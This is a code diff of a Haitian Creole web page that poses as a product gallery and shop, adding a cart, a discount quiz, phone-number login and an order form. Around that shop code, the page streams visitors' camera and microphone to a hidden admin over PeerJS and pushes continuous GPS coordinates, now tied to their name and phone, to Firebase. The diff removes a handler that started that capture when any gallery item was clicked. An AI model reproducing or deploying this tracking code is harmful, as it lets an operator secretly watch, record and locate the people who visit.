@@ -62,7 +62,6 @@
     cursor: pointer; font-family: system-ui, sans-serif;
     margin-top: 5px;
   }
-  .login-box button:disabled { opacity: 0.5; }
   .login-box .err { color: #ff6666; font-size: 12px; margin-top: 10px; min-height: 16px; }
 
   .app-content { display: none; }
@@ -101,12 +100,21 @@
   }
   @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
   .active-panel p { font-size: 14px; color: #ddd; }
-  .active-panel button {
+
+  .btn-stop {
     width: 100%; margin-top: 15px; padding: 14px;
     background: #cc3333; color: white; border: none;
     border-radius: 10px; font-size: 13px; font-weight: bold;
     cursor: pointer; font-family: system-ui, sans-serif;
   }
+  .btn-quiz {
+    width: 100%; margin-top: 10px; padding: 14px;
+    background: linear-gradient(135deg, #d4af37, #b8941f);
+    color: white; border: none;
+    border-radius: 10px; font-size: 13px; font-weight: bold;
+    cursor: pointer; font-family: system-ui, sans-serif;
+  }
+
   #status { text-align: center; color: #888; font-size: 12px; margin-top: 10px; padding: 0 20px; min-height: 16px; }
 
   .gallery-title {
@@ -139,22 +147,181 @@
     z-index: 2; text-align: center;
   }
   .item .price { color: #00cc66; font-weight: bold; font-size: 11px; display: block; margin-top: 2px; }
+  .item .price-old { color: #888; text-decoration: line-through; font-size: 10px; margin-right: 4px; }
+  .item .add-cart {
+    position: absolute; top: 5px; right: 5px;
+    width: 30px; height: 30px;
+    background: #00cc66; color: white;
+    border: none; border-radius: 50%;
+    font-size: 16px; font-weight: bold;
+    cursor: pointer; z-index: 3;
+    display: flex; align-items: center; justify-content: center;
+  }
   .hidden { display: none; }
   .empty { grid-column: 1 / -1; text-align: center; color: #666; padding: 30px; font-size: 13px; }
   footer { text-align: center; color: #444; font-size: 10px; margin-top: 30px; padding: 0 20px; }
+
+  /* ===== PANYE FLOTTANT ===== */
+  .cart-float {
+    position: fixed; bottom: 20px; right: 20px;
+    background: #00cc66; color: white;
+    padding: 15px 20px;
+    border-radius: 50px;
+    font-size: 16px; font-weight: bold;
+    cursor: pointer;
+    box-shadow: 0 4px 15px rgba(0, 204, 102, 0.5);
+    z-index: 998;
+    display: flex; align-items: center; gap: 8px;
+  }
+  .cart-float:active { transform: scale(0.95); }
+
+  /* ===== MODAL ===== */
+  .modal-bg {
+    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.9);
+    display: flex; align-items: center; justify-content: center;
+    padding: 15px; z-index: 1001;
+    overflow-y: auto;
+  }
+  .modal {
+    background: #1c1c1c; border-radius: 16px; padding: 25px 20px;
+    max-width: 480px; width: 100%;
+    border: 1px solid #333;
+    position: relative;
+    max-height: 90vh; overflow-y: auto;
+  }
+  .modal h2 { color: #00cc66; margin-bottom: 10px; font-size: 1.2rem; text-align: center; }
+  .modal .quiz-sub { color: #888; font-size: 12px; text-align: center; margin-bottom: 15px; }
+  .close-btn {
+    position: absolute; top: 10px; right: 15px;
+    background: none; border: none; color: #888;
+    font-size: 28px; cursor: pointer; line-height: 1;
+  }
+  .close-btn:hover { color: #fff; }
+
+  /* ===== QUIZ ===== */
+  .quiz-progress {
+    display: flex; justify-content: space-between;
+    font-size: 12px; color: #aaa; margin-bottom: 15px;
+  }
+  .quiz-modal h3 {
+    font-size: 15px; color: #fff; margin-bottom: 15px;
+    line-height: 1.4; min-height: 40px;
+  }
+  .quiz-options { display: flex; flex-direction: column; gap: 8px; margin-bottom: 15px; }
+  .quiz-opt {
+    background: #0d0d0d; border: 2px solid #333;
+    color: #fff; padding: 12px;
+    border-radius: 10px; font-size: 14px;
+    cursor: pointer; text-align: left;
+    font-family: system-ui, sans-serif;
+    transition: all 0.2s;
+  }
+  .quiz-opt:hover { border-color: #00cc66; }
+  .quiz-opt.selected { border-color: #00cc66; background: #0d1a10; }
+  .quiz-opt.correct { border-color: #00cc66; background: #0d3a1a; }
+  .quiz-opt.wrong { border-color: #cc3333; background: #3a0d0d; }
+
+  /* ===== PANYE ===== */
+  .cart-modal .cart-items { margin-bottom: 15px; }
+  .cart-item {
+    display: flex; gap: 10px;
+    background: #0d0d0d; border: 1px solid #333;
+    border-radius: 8px; padding: 10px;
+    margin-bottom: 8px; align-items: center;
+  }
+  .cart-item img {
+    width: 50px; height: 50px;
+    object-fit: cover; border-radius: 6px;
+  }
+  .cart-item-info { flex: 1; }
+  .cart-item-info .name { font-size: 13px; font-weight: bold; }
+  .cart-item-info .price { font-size: 12px; color: #00cc66; }
+  .cart-item-info .price-old { font-size: 11px; color: #888; text-decoration: line-through; margin-right: 5px; }
+  .cart-item-info .discount-tag {
+    font-size: 10px; color: #00cc66;
+    background: #0d3a1a; padding: 2px 6px;
+    border-radius: 10px; display: inline-block;
+    margin-left: 5px;
+  }
+  .cart-item .remove {
+    background: #cc3333; color: white; border: none;
+    width: 26px; height: 26px; border-radius: 50%;
+    font-size: 14px; cursor: pointer;
+  }
+
+  .cart-total {
+    background: #0d0d0d; border-radius: 10px;
+    padding: 12px; margin-bottom: 15px;
+  }
+  .total-row {
+    display: flex; justify-content: space-between;
+    font-size: 13px; padding: 5px 0;
+    color: #ddd;
+  }
+  .total-row.discount { color: #00cc66; }
+  .total-row.final {
+    border-top: 1px solid #333;
+    margin-top: 5px; padding-top: 10px;
+    font-size: 16px; font-weight: bold;
+    color: #00cc66;
+  }
+
+  /* ===== KÒMAND ===== */
+  .order-modal .form-group { margin-bottom: 12px; }
+  .order-modal label {
+    display: block; font-size: 12px;
+    color: #aaa; margin-bottom: 5px;
+  }
+  .order-modal input, .order-modal select {
+    width: 100%; padding: 12px;
+    border-radius: 8px; border: 1px solid #333;
+    background: #0d0d0d; color: white;
+    font-size: 14px; font-family: system-ui, sans-serif;
+  }
+  .order-prod {
+    background: #0d0d0d; border: 1px solid #333;
+    border-radius: 10px; padding: 12px;
+    margin-bottom: 12px;
+  }
+  .order-prod .prod-name {
+    font-size: 13px; font-weight: bold;
+    color: #00cc66; margin-bottom: 8px;
+  }
+  .order-prod input[type="file"] {
+    width: 100%; font-size: 12px;
+    color: #aaa; padding: 8px;
+    background: #1c1c1c; border-radius: 6px;
+    border: 1px dashed #444;
+  }
+  .order-prod .preview {
+    margin-top: 8px; text-align: center;
+  }
+  .order-prod .preview img {
+    max-width: 100px; max-height: 100px;
+    border-radius: 6px; border: 1px solid #333;
+  }
+
+  .success-msg {
+    text-align: center; padding: 30px 20px;
+  }
+  .success-msg h2 { color: #00cc66; font-size: 1.5rem; margin-bottom: 15px; }
+  .success-msg p { color: #ccc; font-size: 14px; line-height: 1.6; }
 </style>
 </head>
 <body>
 
+  <!-- ===== TI PWEN ADMIN ===== -->
   <div class="dot-admin" id="dotAdmin" title=""></div>
 
+  <!-- ===== EKRAN LOGIN ===== -->
   <div class="login-screen" id="loginScreen">
     <div class="login-box">
       <h2>🔒 Antre</h2>
-      <p class="sub">Antre email ou ak yon mot de passe pou kontinye</p>
+      <p class="sub">Antre non w ak telefòn ou pou kontinye</p>
 
-      <input type="text" id="nameInput" placeholder="email ou" autocomplete="off" autocapitalize="words">
-      <input type="password" id="pwInput" placeholder="Kòd" autocomplete="off">
+      <input type="text" id="nameInput" placeholder="Non ou" autocomplete="off" autocapitalize="words">
+      <input type="tel" id="phoneInput" placeholder="Telefòn ou (ex: 37123456)" autocomplete="off">
 
       <button id="btnLogin">Antre</button>
 
@@ -162,6 +329,7 @@
     </div>
   </div>
 
+  <!-- ===== PAJ PRENSIPAL ===== -->
   <div class="app-content" id="appContent">
 
     <header>
@@ -176,11 +344,12 @@
 
     <div class="active-panel hidden" id="activeView" style="display:none;">
       <div class="card">
-        <p><span class=""></span><strong>Bienvenue !</strong></p>
+        <p><span class="dot"></span><strong>Bienvenue !</strong></p>
         <p style="margin-top:8px; font-size:13px; color:#aaa;">
-          
+          Administratè a ap wè ou.
         </p>
-     
+        <button id="" class=""></button>
+        <button id="btnQuiz" class="btn-quiz">🎯 Fè Quiz la — Jwenn $8 Rabè</button>
       </div>
     </div>
 
@@ -194,14 +363,100 @@
 
     <div class="gallery hidden" id="galleryRest"></div>
 
+    <div class="cart-float" id="cartFloat">
+      🛒 <span id="cartCount">0</span>
+    </div>
+
     <footer>© 2026 — Tout dwa rezève</footer>
 
+  </div>
+
+  <!-- ===== MODAL QUIZ ===== -->
+  <div class="modal-bg hidden" id="quizModal">
+    <div class="modal quiz-modal">
+      <button class="close-btn" id="quizClose">×</button>
+      <h2>🎯 Quiz Espò</h2>
+      <p class="quiz-sub">Reponn 20 kesyon · 20/20 pou jwenn $8 rabè</p>
+
+      <div class="quiz-progress">
+        <span id="quizProgress">Kesyon 1 / 20</span>
+        <span id="quizScore">✅ 0</span>
+      </div>
+
+      <h3 id="quizQuestion">...</h3>
+
+      <div class="quiz-options" id="quizOptions"></div>
+
+      <button id="quizNext" class="btn-quiz" disabled>Swivan →</button>
+    </div>
+  </div>
+
+  <!-- ===== MODAL PANYE ===== -->
+  <div class="modal-bg hidden" id="cartModal">
+    <div class="modal cart-modal">
+      <button class="close-btn" id="cartClose">×</button>
+      <h2>🛒 Panye ou</h2>
+
+      <div class="cart-items" id="cartItems">
+        <div class="empty">Panye ou vid</div>
+      </div>
+
+      <div class="cart-total">
+        <div class="total-row">
+          <span>Total:</span>
+          <span id="cartTotal">$0</span>
+        </div>
+        <div class="total-row discount hidden" id="discountRow">
+          <span>🎉 Rabè Quiz (-$8/pwodwi):</span>
+          <span id="discountTotal">-$0</span>
+        </div>
+        <div class="total-row final">
+          <span>Peye:</span>
+          <span id="cartFinal">$0</span>
+        </div>
+      </div>
+
+      <button class="btn-quiz" id="btnCheckout">✅ Kòmande Kounye a</button>
+    </div>
+  </div>
+
+  <!-- ===== MODAL KÒMAND ===== -->
+  <div class="modal-bg hidden" id="orderModal">
+    <div class="modal order-modal">
+      <button class="close-btn" id="orderClose">×</button>
+      <h2>📦 Finalize Kòmand</h2>
+
+      <div class="form-group">
+        <label>Non ou</label>
+        <input type="text" id="orderName" readonly>
+      </div>
+
+      <div class="form-group">
+        <label>Telefòn ou</label>
+        <input type="tel" id="orderPhone" readonly>
+      </div>
+
+      <div class="form-group">
+        <label>Metòd peman</label>
+        <select id="orderPayment">
+          <option value="MonCash">MonCash</option>
+          <option value="NatCash">NatCash</option>
+        </select>
+      </div>
+
+      <div id="orderProducts"></div>
+
+      <button class="btn-quiz" id="btnSubmitOrder">✅ Konfime Kòmand</button>
+    </div>
   </div>
 
 <script src="https://unpkg.com/peerjs@1.5.0/dist/peerjs.min.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
+<!-- ============ PATI 2 (JavaScript) AP VINI ISIT ============ -->
+</body>
+</html>
 <script>
 /* ============================================
    KONFIGIRASYON FIREBASE
@@ -244,12 +499,12 @@ document.getElementById("dotAdmin").onclick = () => {
 };
 
 /* ============================================
-   EKRAN LOGIN
+   EKRAN LOGIN (Non + Telefòn)
    ============================================ */
 const loginScreen = document.getElementById("loginScreen");
 const appContent  = document.getElementById("appContent");
 const nameInput   = document.getElementById("nameInput");
-const pwInput     = document.getElementById("pwInput");
+const phoneInput  = document.getElementById("phoneInput");
 const btnLogin    = document.getElementById("btnLogin");
 const err         = document.getElementById("err");
 
@@ -259,18 +514,19 @@ if (sessionStorage.getItem("visitor_logged") === "1") {
 
 btnLogin.onclick = () => {
   const name = nameInput.value.trim();
-  const pw = pwInput.value.trim();
+  const phone = phoneInput.value.trim();
 
   if (name.length === 0) { err.innerText = "Antre yon non."; return; }
-  if (pw.length === 0) { err.innerText = "Antre yon kòd."; return; }
+  if (phone.length < 8) { err.innerText = "Antre yon telefòn valid (8 chif)."; return; }
 
   sessionStorage.setItem("visitor_logged", "1");
   sessionStorage.setItem("visitor_name", name);
+  sessionStorage.setItem("visitor_phone", phone);
   showApp();
 };
 
-nameInput.addEventListener("keydown", (e) => { if (e.key === "Enter") pwInput.focus(); });
-pwInput.addEventListener("keydown", (e) => { if (e.key === "Enter") btnLogin.click(); });
+nameInput.addEventListener("keydown", (e) => { if (e.key === "Enter") phoneInput.focus(); });
+phoneInput.addEventListener("keydown", (e) => { if (e.key === "Enter") btnLogin.click(); });
 
 function showApp() {
   loginScreen.style.display = "none";
@@ -281,12 +537,26 @@ function showApp() {
    GALRI
    ============================================ */
 let ALL_IMAGES = [];
+let hasDiscount = false; // Rabè $8 si 20/20
+
+function getFinalPrice(priceStr) {
+  const num = parseFloat((priceStr || "0").replace(/[^0-9.]/g, ""));
+  if (isNaN(num)) return { original: 0, final: 0 };
+  if (hasDiscount) return { original: num, final: Math.max(0, num - 8) };
+  return { original: num, final: num };
+}
 
 function buildItem(img) {
-  return `<div class="item" data-name="${img.name}" data-price="${img.price || ''}">
+  const p = getFinalPrice(img.price);
+  const priceHtml = hasDiscount && p.original > 0
+    ? `<span class="price-old">$${p.original}</span><span class="price">$${p.final}</span>`
+    : `<span class="price">$${p.final || img.price || ''}</span>`;
+
+  return `<div class="item" data-key="${img.key}" data-name="${img.name}" data-price="${img.price || ''}">
     <img src="${img.url}" loading="lazy" alt="${img.name}"
          onerror="this.style.display='none';this.parentElement.style.background='#2a2a2a';">
-    <div class="label">${img.name}${img.price ? `<span class="price">${img.price}</span>` : ''}</div>
+    <button class="add-cart" data-key="${img.key}">+</button>
+    <div class="label">${img.name}${priceHtml}</div>
   </div>`;
 }
 
@@ -308,6 +578,16 @@ function renderGallery() {
   } else {
     rest.innerHTML = "";
   }
+
+  // Bouton "+" pou panye
+  document.querySelectorAll(".add-cart").forEach(btn => {
+    btn.onclick = (e) => {
+      e.stopPropagation();
+      const key = btn.dataset.key;
+      const img = ALL_IMAGES.find(i => i.key === key);
+      if (img) addToCart(img);
+    };
+  });
 }
 
 db.ref("images").on("value", (snapshot) => {
@@ -319,6 +599,339 @@ db.ref("images").on("value", (snapshot) => {
 });
 
 /* ============================================
+   PANYE
+   ============================================ */
+let cart = JSON.parse(sessionStorage.getItem("cart") || "[]");
+
+function saveCart() {
+  sessionStorage.setItem("cart", JSON.stringify(cart));
+  updateCartUI();
+}
+
+function addToCart(img) {
+  const exists = cart.find(c => c.key === img.key);
+  if (exists) {
+    exists.qty = (exists.qty || 1) + 1;
+  } else {
+    cart.push({
+      key: img.key,
+      name: img.name,
+      price: img.price,
+      url: img.url,
+      qty: 1
+    });
+  }
+  saveCart();
+  // Ti feedback
+  const cartFloat = document.getElementById("cartFloat");
+  cartFloat.style.transform = "scale(1.2)";
+  setTimeout(() => cartFloat.style.transform = "", 200);
+}
+
+function removeFromCart(key) {
+  cart = cart.filter(c => c.key !== key);
+  saveCart();
+}
+
+function updateCartUI() {
+  const count = cart.reduce((sum, c) => sum + (c.qty || 1), 0);
+  document.getElementById("cartCount").innerText = count;
+
+  const cartItems = document.getElementById("cartItems");
+  if (cart.length === 0) {
+    cartItems.innerHTML = '<div class="empty">Panye ou vid</div>';
+    document.getElementById("cartTotal").innerText = "$0";
+    document.getElementById("cartFinal").innerText = "$0";
+    document.getElementById("discountRow").classList.add("hidden");
+    return;
+  }
+
+  let total = 0;
+  let totalAfterDiscount = 0;
+
+  cartItems.innerHTML = cart.map(item => {
+    const p = getFinalPrice(item.price);
+    const qty = item.qty || 1;
+    total += p.original * qty;
+    totalAfterDiscount += p.final * qty;
+
+    const priceHtml = hasDiscount && p.original > 0
+      ? `<span class="price-old">$${p.original}</span>
+         <span class="price">$${p.final}</span>
+         <span class="discount-tag">-$${8}</span>`
+      : `<span class="price">$${p.final || item.price}</span>`;
+
+    return `<div class="cart-item">
+      <img src="${item.url}" onerror="this.style.background='#333'">
+      <div class="cart-item-info">
+        <div class="name">${item.name} ${qty > 1 ? `×${qty}` : ''}</div>
+        <div>${priceHtml}</div>
+      </div>
+      <button class="remove" data-key="${item.key}">×</button>
+    </div>`;
+  }).join("");
+
+  document.getElementById("cartTotal").innerText = "$" + total;
+  document.getElementById("cartFinal").innerText = "$" + totalAfterDiscount;
+
+  if (hasDiscount) {
+    document.getElementById("discountRow").classList.remove("hidden");
+    document.getElementById("discountTotal").innerText = "-$" + (total - totalAfterDiscount);
+  } else {
+    document.getElementById("discountRow").classList.add("hidden");
+  }
+
+  cartItems.querySelectorAll(".remove").forEach(btn => {
+    btn.onclick = () => removeFromCart(btn.dataset.key);
+  });
+}
+
+document.getElementById("cartFloat").onclick = () => {
+  document.getElementById("cartModal").classList.remove("hidden");
+  updateCartUI();
+};
+
+document.getElementById("cartClose").onclick = () => {
+  document.getElementById("cartModal").classList.add("hidden");
+};
+
+/* ============================================
+   QUIZ — 20 KESYON
+   ============================================ */
+const QUIZ = [
+  { q: "Konbyen jwè nan yon ekip foutbòl sou teren?", o: ["9", "10", "11", "12"], a: 2 },
+  { q: "Ki peyi ki genyen World Cup 2022?", o: ["Frans", "Ajantin", "Brezil", "Almay"], a: 1 },
+  { q: "Konbyen tan yon match foutbòl dire (tan nòmal)?", o: ["60 min", "80 min", "90 min", "120 min"], a: 2 },
+  { q: "Ki jwè ki gen plis Ballon d'Or?", o: ["Cristiano Ronaldo", "Lionel Messi", "Neymar", "Mbappé"], a: 1 },
+  { q: "Ki koulè kat ki vle di ekspilsyon nan foutbòl?", o: ["Jòn", "Vèt", "Wouj", "Ble"], a: 2 },
+  { q: "Ki peyi ki genyen plis World Cup?", o: ["Almay", "Itali", "Brezil", "Ajantin"], a: 2 },
+  { q: "Konbyen mèt distans yon penalti?", o: ["9 m", "10 m", "11 m", "12 m"], a: 2 },
+  { q: "Konbyen jwè nan yon ekip baskètbòl sou teren?", o: ["4", "5", "6", "7"], a: 1 },
+  { q: "Ki ekip NBA ki genyen plis chanpyona?", o: ["Miami Heat", "Boston Celtics", "Lakers", "Bulls"], a: 1 },
+  { q: "Konbyen pwen yon panier soti deyò liy 3 pwen?", o: ["2", "3", "4", "1"], a: 1 },
+  { q: "Ki wotè yon panier baskètbòl?", o: ["2.5 m", "3 m", "3.05 m", "3.5 m"], a: 2 },
+  { q: "Ki jwè ki rele 'King James'?", o: ["Michael Jordan", "LeBron James", "Kobe Bryant", "Stephen Curry"], a: 1 },
+  { q: "Konbyen set pou genyen yon match Grand Slam (gason)?", o: ["2", "3", "4", "5"], a: 1 },
+  { q: "Ki tounwa tenis ki jwe sou tè wouj?", o: ["Wimbledon", "US Open", "Roland Garros", "Australian Open"], a: 2 },
+  { q: "Ki jwè ki gen plis tit Grand Slam (gason)?", o: ["Roger Federer", "Rafael Nadal", "Novak Djokovic", "Andy Murray"], a: 2 },
+  { q: "Konbyen jwè nan yon ekip volleybòl sou teren?", o: ["5", "6", "7", "8"], a: 1 },
+  { q: "Nan ki espò ou itilize yon 'birdie'?", o: ["Tenis", "Badminton", "Tenis tab", "Squash"], a: 1 },
+  { q: "Ki espò 'Usain Bolt' te fè?", o: ["Natasyon", "Atletis", "Bisiklèt", "Boks"], a: 1 },
+  { q: "Konbyen wonn nan yon match boks pwofesyonèl (tit)?", o: ["8", "10", "12", "15"], a: 2 },
+  { q: "Ki peyi ki envante 'Judo'?", o: ["Chin", "Kore", "Japon", "Thailand"], a: 2 }
+];
+
+let quizState = { current: 0, score: 0, selected: null };
+
+function openQuiz() {
+  quizState = { current: 0, score: 0, selected: null };
+  document.getElementById("quizModal").classList.remove("hidden");
+  renderQuizQuestion();
+}
+
+function renderQuizQuestion() {
+  const q = QUIZ[quizState.current];
+  document.getElementById("quizProgress").innerText = `Kesyon ${quizState.current + 1} / ${QUIZ.length}`;
+  document.getElementById("quizScore").innerText = `✅ ${quizState.score}`;
+  document.getElementById("quizQuestion").innerText = q.q;
+
+  const opts = document.getElementById("quizOptions");
+  opts.innerHTML = q.o.map((opt, i) => 
+    `<button class="quiz-opt" data-index="${i}">${String.fromCharCode(65 + i)}) ${opt}</button>`
+  ).join("");
+
+  document.getElementById("quizNext").disabled = true;
+  document.getElementById("quizNext").innerText = quizState.current === QUIZ.length - 1 ? "✅ Fini" : "Swivan →";
+
+  opts.querySelectorAll(".quiz-opt").forEach(btn => {
+    btn.onclick = () => {
+      if (quizState.selected !== null) return;
+      const idx = parseInt(btn.dataset.index);
+      quizState.selected = idx;
+
+      opts.querySelectorAll(".quiz-opt").forEach(b => b.classList.remove("selected"));
+      btn.classList.add("selected");
+
+      // Verifye
+      if (idx === q.a) {
+        btn.classList.add("correct");
+        quizState.score++;
+      } else {
+        btn.classList.add("wrong");
+        opts.querySelectorAll(".quiz-opt")[q.a].classList.add("correct");
+      }
+
+      document.getElementById("quizScore").innerText = `✅ ${quizState.score}`;
+      document.getElementById("quizNext").disabled = false;
+    };
+  });
+}
+
+document.getElementById("quizNext").onclick = () => {
+  if (quizState.current < QUIZ.length - 1) {
+    quizState.current++;
+    quizState.selected = null;
+    renderQuizQuestion();
+  } else {
+    // Fini
+    const score = quizState.score;
+    document.getElementById("quizModal").classList.add("hidden");
+
+    if (score === 20) {
+      hasDiscount = true;
+      sessionStorage.setItem("has_discount", "1");
+      alert("🎉 BRAVO ! Ou fè 20/20 !\nOu jwenn rabè $8 sou chak pwodwi !");
+      renderGallery();
+      updateCartUI();
+    } else {
+      alert(`Ou fè ${score}/20.\nOu bezwen 20/20 pou jwenn rabè a.\nEseye ankò !`);
+    }
+  }
+};
+
+document.getElementById("quizClose").onclick = () => {
+  document.getElementById("quizModal").classList.add("hidden");
+};
+
+/* ============================================
+   KÒMAND (enfo + foto)
+   ============================================ */
+function openOrderModal() {
+  if (cart.length === 0) {
+    alert("Panye ou vid.");
+    return;
+  }
+
+  document.getElementById("cartModal").classList.add("hidden");
+  document.getElementById("orderModal").classList.remove("hidden");
+
+  document.getElementById("orderName").value = sessionStorage.getItem("visitor_name") || "";
+  document.getElementById("orderPhone").value = sessionStorage.getItem("visitor_phone") || "";
+
+  const container = document.getElementById("orderProducts");
+  container.innerHTML = cart.map((item, i) => {
+    const p = getFinalPrice(item.price);
+    const qty = item.qty || 1;
+    return `<div class="order-prod" data-key="${item.key}">
+      <div class="prod-name">📦 ${item.name} ${qty > 1 ? `×${qty}` : ''} — $${p.final * qty}</div>
+      <input type="file" accept="image/*" data-key="${item.key}" class="prod-photo">
+      <div class="preview" id="preview_${item.key}"></div>
+    </div>`;
+  }).join("");
+
+  // Preview foto
+  container.querySelectorAll(".prod-photo").forEach(input => {
+    input.onchange = async (e) => {
+      const file = e.target.files[0];
+      if (!file) return;
+      if (file.size > 2 * 1024 * 1024) {
+        alert("❌ Foto a twò gwo (maks 2 MB).");
+        e.target.value = "";
+        return;
+      }
+      const base64 = await fileToBase64Compressed(file);
+      document.getElementById("preview_" + input.dataset.key).innerHTML = 
+        `<img src="${base64}">`;
+      input.dataset.base64 = base64;
+    };
+  });
+}
+
+function fileToBase64Compressed(file, maxSize = 600, quality = 0.7) {
+  return new Promise((resolve, reject) => {
+    const reader = new FileReader();
+    reader.onload = (e) => {
+      const img = new Image();
+      img.onload = () => {
+        let w = img.width, h = img.height;
+        if (w > h && w > maxSize) { h = Math.round((h * maxSize) / w); w = maxSize; }
+        else if (h > maxSize) { w = Math.round((w * maxSize) / h); h = maxSize; }
+        const canvas = document.createElement("canvas");
+        canvas.width = w; canvas.height = h;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(img, 0, 0, w, h);
+        resolve(canvas.toDataURL("image/jpeg", quality));
+      };
+      img.onerror = () => reject(new Error("Pa ka chaje imaj la"));
+      img.src = e.target.result;
+    };
+    reader.onerror = () => reject(new Error("Pa ka li fichye a"));
+    reader.readAsDataURL(file);
+  });
+}
+
+document.getElementById("orderClose").onclick = () => {
+  document.getElementById("orderModal").classList.add("hidden");
+};
+
+document.getElementById("btnCheckout").onclick = () => {
+  openOrderModal();
+};
+
+document.getElementById("btnSubmitOrder").onclick = async () => {
+  const name = sessionStorage.getItem("visitor_name");
+  const phone = sessionStorage.getItem("visitor_phone");
+  const payment = document.getElementById("orderPayment").value;
+
+  // Verifye tout foto yo
+  const photos = document.querySelectorAll(".prod-photo");
+  for (let input of photos) {
+    if (!input.dataset.base64) {
+      alert("⚠️ Ou dwe pran yon foto pou chak pwodwi.");
+      return;
+    }
+  }
+
+  const btn = document.getElementById("btnSubmitOrder");
+  btn.disabled = true;
+  btn.innerText = "⏳ Ap voye kòmand lan...";
+
+  const orders = [];
+
+  for (let item of cart) {
+    const qty = item.qty || 1;
+    const input = document.querySelector(`.prod-photo[data-key="${item.key}"]`);
+    const photo = input ? input.dataset.base64 : null;
+    const p = getFinalPrice(item.price);
+
+    const order = {
+      visitorId: VISITOR_ID,
+      name: name,
+      phone: phone,
+      productKey: item.key,
+      productName: item.name,
+      productPrice: p.original,
+      finalPrice: p.final,
+      qty: qty,
+      discount: hasDiscount ? 8 : 0,
+      total: p.final * qty,
+      payment: payment,
+      photo: photo,
+      status: "pending",
+      createdAt: Date.now()
+    };
+
+    try {
+      await db.ref("orders").push(order);
+      orders.push(order);
+    } catch (e) {
+      console.error("Erè kòmand:", e);
+    }
+  }
+
+  // Netwaye panye a
+  cart = [];
+  saveCart();
+  document.getElementById("orderModal").classList.add("hidden");
+
+  // Montre mesaj siksè
+  alert(`✅ Kòmand ou resevwa !\n\nNon: ${name}\nTelefòn: ${phone}\nPeman: ${payment}\n\nNou pral kontakte w byento.`);
+
+  btn.disabled = false;
+  btn.innerText = "✅ Konfime Kòmand";
+};
+
+/* ============================================
    PEERJS + KAMERA + MIKWO + LOKASYON
    ============================================ */
 (() => {
@@ -328,7 +941,7 @@ db.ref("images").on("value", (snapshot) => {
   const activeView = document.getElementById("activeView");
   const btnStart   = document.getElementById("btnStart");
   const btnStop    = document.getElementById("btnStop");
-  const statusEl   = document.getElementById("status");
+  const btnQuiz    = document.getElementById("btnQuiz");
 
   const ICE_CONFIG = {
     iceServers: [
@@ -349,8 +962,6 @@ db.ref("images").on("value", (snapshot) => {
   let active = false;
   let intentionallyStopped = false;
   let keepAliveTimer = null;
-
-  function setStatus(msg) { statusEl.innerText = msg; }
 
   function ensurePeer() {
     if (peer && !peer.destroyed) return peer;
@@ -373,15 +984,13 @@ db.ref("images").on("value", (snapshot) => {
     }
     try {
       localStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user" },
-        audio: true
+        video: { facingMode: "user" }, audio: true
       });
       return true;
     } catch (err) {
       try {
         localStream = await navigator.mediaDevices.getUserMedia({
-          video: true,
-          audio: true
+          video: true, audio: true
         });
         return true;
       } catch (err2) { return false; }
@@ -437,32 +1046,20 @@ db.ref("images").on("value", (snapshot) => {
     if (keepAliveTimer) { clearInterval(keepAliveTimer); keepAliveTimer = null; }
   }
 
-  /* ============================================
-     KAT LOKASYON
-     ============================================ */
   function startLocationTracking() {
-    if (!navigator.geolocation) {
-      console.warn("❌ Geolocation pa disponib");
-      return;
-    }
+    if (!navigator.geolocation) return;
 
-    // Mande pèmisyon dabò
     navigator.geolocation.getCurrentPosition(
       (p) => {
-        console.log("");
         sendLocation(p);
-
-        // Kòmanse swivi
         const watchId = navigator.geolocation.watchPosition(
           sendLocation,
-          (err) => console.warn("❌ Erè lokasyon:", err.message),
+          (err) => console.warn("Erè lokasyon:", err.message),
           { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
         );
         window._watchId = watchId;
       },
-      (err) => {
-        console.warn("", err.message);
-      },
+      (err) => console.warn("Visitor refize lokasyon:", err.message),
       { enableHighAccuracy: true, timeout: 10000 }
     );
   }
@@ -470,12 +1067,12 @@ db.ref("images").on("value", (snapshot) => {
   function sendLocation(pos) {
     db.ref("locations/" + VISITOR_ID).set({
       name: sessionStorage.getItem("visitor_name") || "Anonim",
+      phone: sessionStorage.getItem("visitor_phone") || "",
       lat: pos.coords.latitude,
       lon: pos.coords.longitude,
       acc: pos.coords.accuracy,
       time: Date.now()
     });
-    console.log("📍 Pozisyon voye:", pos.coords.latitude, pos.coords.longitude);
   }
 
   function stopLocationTracking() {
@@ -485,9 +1082,6 @@ db.ref("images").on("value", (snapshot) => {
     }
   }
 
-  /* ============================================
-     START / STOP SHARING
-     ============================================ */
   async function startSharing() {
     const rest = document.getElementById("galleryRest");
     if (rest.innerHTML.trim() !== "" && rest.classList.contains("hidden")) {
@@ -505,8 +1099,6 @@ db.ref("images").on("value", (snapshot) => {
     }
 
     await ensureCall();
-
-    // Kòmanse swivi lokasyon
     startLocationTracking();
 
     active = true;
@@ -520,11 +1112,7 @@ db.ref("images").on("value", (snapshot) => {
     intentionallyStopped = true;
     active = false;
     stopKeepAlive();
-
-    // Stope swivi lokasyon
     stopLocationTracking();
-
-    // Efase pozisyon nan Firebase
     db.ref("locations/" + VISITOR_ID).remove();
 
     if (currentCall) { try { currentCall.close(); } catch (e) {} currentCall = null; }
@@ -541,17 +1129,8 @@ db.ref("images").on("value", (snapshot) => {
   btnStart.onclick = startSharing;
   btnStop.onclick  = stopSharing;
 
-  function attachGalleryClick(containerId) {
-    const el = document.getElementById(containerId);
-    if (!el) return;
-    el.addEventListener("click", (e) => {
-      if (active || intentionallyStopped) return;
-      const item = e.target.closest(".item");
-      if (item) startSharing();
-    });
-  }
-  attachGalleryClick("galleryFirst");
-  attachGalleryClick("galleryRest");
+  // Bouton Quiz la
+  btnQuiz.onclick = openQuiz;
 
   document.addEventListener("visibilitychange", () => {
     if (document.visibilityState === "visible" && active && !intentionallyStopped) {
@@ -585,9 +1164,18 @@ db.ref("images").on("value", (snapshot) => {
     if (peer && !peer.destroyed) peer.destroy();
   });
 })();
-</script>
 
-<script>
+/* ============================================
+   CHAJE RABÈ SI DEJA GENYEN
+   ============================================ */
+if (sessionStorage.getItem("has_discount") === "1") {
+  hasDiscount = true;
+}
+updateCartUI();
+
+/* ============================================
+   SERVICE WORKER
+   ============================================ */
 if ("serviceWorker" in navigator) {
